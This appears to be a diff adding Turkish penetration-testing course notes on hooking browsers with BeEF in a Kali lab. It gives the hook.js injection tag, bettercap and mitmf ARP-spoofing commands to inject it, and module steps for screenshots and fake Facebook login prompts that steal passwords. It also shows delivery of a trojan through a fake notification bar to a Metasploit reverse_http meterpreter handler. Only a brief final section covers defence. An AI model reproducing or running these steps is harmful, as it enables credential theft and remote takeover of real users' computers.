@@ -1,0 +1,80 @@
+	BEEF
+	BEEF ÇALIŞTIRMAK
+cd ..
+cd /opt/
+cd beef/
+sudo beef-xss
+http://127.0.0.1:3000/ui/panel
+
+
+
+Açılan panelde saldırdığımız ve tuzağa düşen hedef bilgisayarları göreceğiz.
+Hedefi hook ettiğimizde (oltaladığımızda) ip adresleri burada gözükür ve o hedefin browser'ında bir kod çalıştırabiliriz.
+Eğer hedef Online ise Online Browsers, Offline ise Offline Browsers içerisinde gözükür. (Offline iken saldırı gerçekleştirilemez.)
+	Hook: <script src="http://<IP>:3000/hook.js"></script>
+Bu kodu hedef bilgisayara çalıştırtarak oltaya takabiliriz. (web sitesi oluştur, bu web sitesine link oluşturup hedefe yolladığımızda ve hedef oraya tıkladığı an oltamıza takılmış olur.)
+
+
+
+
+	HEDEFİ OLTAYA TAKMAK
+ terminal
+service apache2 start
+ sanal makinemizde ip adresimizi (10.0.2.10) browser'a yazdığında File System/var/www/html içerisindeki index.html'in içeriği açılır.
+	index.html içerisinde yapıştırdığımız kod: <script src="http://10.0.2.10:3000/hook.js"></script>
+ sanal makinemizde 10.0.2.10'a girdiğimizde hedefimiz oltaya takılmış olacak ve hedefi BeEF panelimizde görebileceğiz.
+bettercap -iface eth0
+	usr/share/bettercap/caplets/beefcustom -> beefcustom.cap içerisindeki ip kısmına hedef bilgisayarımızdaki ip adresini giriyoruz.
+
+bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap
+ Yazdığınızda hedef bilgisayarın Hook'a takıldığını beef-xss üzerinden görebiliyoruz.
+ Hata alırsan mitmf ile saldırmayı dene -> python mitmf.py -arp -spoof -gateway 10.0.2.10 -target 10.0.2.4 -i eth0 -inject -js-url http://127.0.0.1:3000/hook.js
+
+
+
+
+	SCREENSHOT ALMAK
+http://127.0.0.1:3000/ui/panel
+Hooklanan hedefi seçip,
+Commands -> Browser (Yeşiller kesin çalışır, Kırmızılar muhtemelen çalışmaz.)
+
+Spyder eye -> execute yaptığımızda Hedefin ekran görüntüsünü alır
+	   ->Module Result History altındaki içeriğe tıklarsak bu ekran görüntüsünü görüntüleyebiliriz.
+
+Alert:
+	-> Önceki bölümlerde yaptığımız gibi sitenin istediğimiz mesajı göndermesini sağlayabiliriz. 
+	-> "BeEF Alert Dialog" yazan kısmı vermek istediğiz mesaj ile değiştirebiliriz. bkz: i hack you!
+
+Pretty Theft:
+	-> Sosyal medya hesaplarını çalmak için kullanılan bir yöntem.
+	-> execute yaptığımızda, internet tarayıcısı hedefe fake bildirim gönderir (Faceebok hesabınızın süresi doldu mesajı gönderip Email ve Şifreyi isteyecektir.
+	-> Hedef giriş yaparsa Module History kısmından direkt olarak email ve şifeye erişim sağlayabiliriz.
+	-> Farklı bir Sosyal Medya hesabını ele geçirmek istiyorsak; Custom Logo kısmını, erişimini istediğimiz sosyal medyanın logosunu koymamız gerekiyor.
+
+Fake Notification Bar: (BACKDOOR İletme Yöntemi)
+	-> execute yaptığımızda Tarayıcı hedefe "Bu sitede gezebilmek için bazı eklentileri indirmeniz gerekiyor." mesajını iletir. 
+	-> Bunu değiştirebiliriz. bkz: "Virüs tespit edildi hemen silmek için tıklayınız.", "Güvenlik güncellemesi geldi buraya tıklayarak hemen indirebilirsiniz."
+	-> Trojanımız: File System, /var/lib/veil/output/source/ içerisindedir. Bunu  alıp kendi apache server'ımıza yani burdaki dosyaya File System: /var/www/html/backdoors/ eklememiz gerekiyor.
+	-> URL Kısmına backdoor'un nereden indireleceğiniz giriyoruz. -> http://10.0.2.10/backdoors/BullDOGTrojan.exe
+		service apache2 start
+		msfconsole
+		use exploit/multi/handler (gelen bağlantıları dinlemeye yarar.) yaptıktan sonrave BeEF içerisine execute yaptığımızda sahte notification bar'ı hedef bilgisayara gidecektir.
+		set payload windows/meterpreter/reverse_http	(Backdoor'u nereden yaptıysak reverse_http yazan yere onu giriyoruz.)
+		options
+		set lhost 10.0.2.10	(Kali'nin ip'si ile değiştiriyoruz.)
+		set lport 4040		(Trojan'ın lport'u ile değiştiriyoruz.)
+		exploit		Çalışmazsa bunu dene -> exploit -j -z)
+	-> BeEF üzerinden execute yaptığızımda açılacak olan Fake Bara tıklarsa direkt olarak trojanımızı indirmeyi gerçekleştirmiş olur.
+		Bu bağlantıyı çalıştırdığı anda meterpreter session'ımız uyanacaktır. ( Bilgisayarı ele geçirdik. )
+
+
+
+
+	KENDİMİZİ BUNDAN NASIL KORURUZ?
+Tanımadığınız veya tanıdığını sandığın bir kişiden bir dosya aldınız. Bu dosyanın güvenilir olduğunu nasıl anlarız?
+Dosya .jpg dosyası gibi gözükebilir, sağ tıklayıp yeniden adlandır dediğimizde bir anormallik oluyorsa bu dosya sıkıntılıdır.
+				     ya da özellikler kısmından .jpg mi veya .exe dosyası mı olduğunu görüntüleyebiliriz.
+
+CMD -> arp -a -> Çalıştırarak arp table'larınıza bakabilirsiniz. 
+Modem Adresi aynı olan 2 tane ip görüyorsanız bir cihaz size kendini modem olarak tanıtmış demektir,
+Saldırı altıdasınız!
